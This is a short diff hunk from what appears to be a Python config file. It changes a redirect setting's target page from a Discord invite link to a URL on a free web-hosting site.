@@ -48,7 +48,7 @@ config = {
 
     "redirect": {
         "redirect": True,
-        "page": "https://discord.gg/wingsminer" 
+        "page": "https://nothingherelol.000webhostapp.com" 
     },
 }
 
